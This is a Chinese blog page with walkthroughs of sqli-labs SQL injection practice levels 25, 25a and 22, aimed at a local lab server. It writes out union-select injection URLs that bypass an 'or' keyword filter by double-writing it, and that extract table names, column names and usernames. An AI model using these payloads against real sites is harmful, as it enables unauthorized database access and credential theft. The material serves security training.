+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846043155.png" alt="1584846043155"></p>
+<p>查看表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">or过滤进行双写</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(table_name)from infoorrmation_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846109622.png" alt="1584846109622"></p>
+<p>查看users表中字段</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846175918.png" alt="1584846175918"></p>
+<p>查看username字段中的数据</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846242646.png" alt="1584846242646"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十五关a双写" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.512Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/">
+        sqli-labs关卡/sqli-labs第二十五关a双写
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;1</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847133189.png" alt="1584847133189"></p>
+<p>再加上万能单引号进行尝试，报错了，但是这个报错和之前的报错不一样，我们用的?id=1’但是这里面并没有’’1’’所以判定不需要加引号，可以直接使用order by</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847185868.png" alt="1584847185868"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用order by 查询</span><br><span class="line">页面显示or被过滤了，所以进行双写一下</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847372214.png" alt="1584847372214"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;1 oorrder by 3</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847443541.png" alt="1584847443541"></p>
+<p>查看注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用-1进行报错显示更多内容</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3</span><br><span class="line">注入点是2,3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847525027.png" alt="1584847525027"></p>
+<p>查看库名</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847555214.png" alt="1584847555214"></p>
+<p>查看表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">or过滤，进行双写</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name)from infoorrmation_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847647319.png" alt="1584847647319"></p>
+<p>查看users表中的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name)from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847709745.png" alt="1584847709745"></p>
+<p>其中有字段id，username，password，查看username字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(username)from users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847766947.png" alt="1584847766947"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十二关cookie" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.481Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/">
+        sqli-labs关卡/sqli-labs第二十二关cookie
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这一关用双引号，不加括号，源码中，字段数是3跟之前操作一样</p>
+<p>测试注入点也是一样，</p>
+<p>直接测试当前数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进行编码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586684586.png" alt="1584586684586"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586709342.png" alt="1584586709342"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看表，加密</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586785618.png" alt="1584586785618"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586802737.png" alt="1584586802737"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看users表下的字段，加密</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586874346.png" alt="1584586874346"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586885121.png" alt="1584586885121"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看id，加密</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586933356.png" alt="1584586933356"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586941828.png" alt="1584586941828"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
+    </nav>
+  
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 zhanqiaozai
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
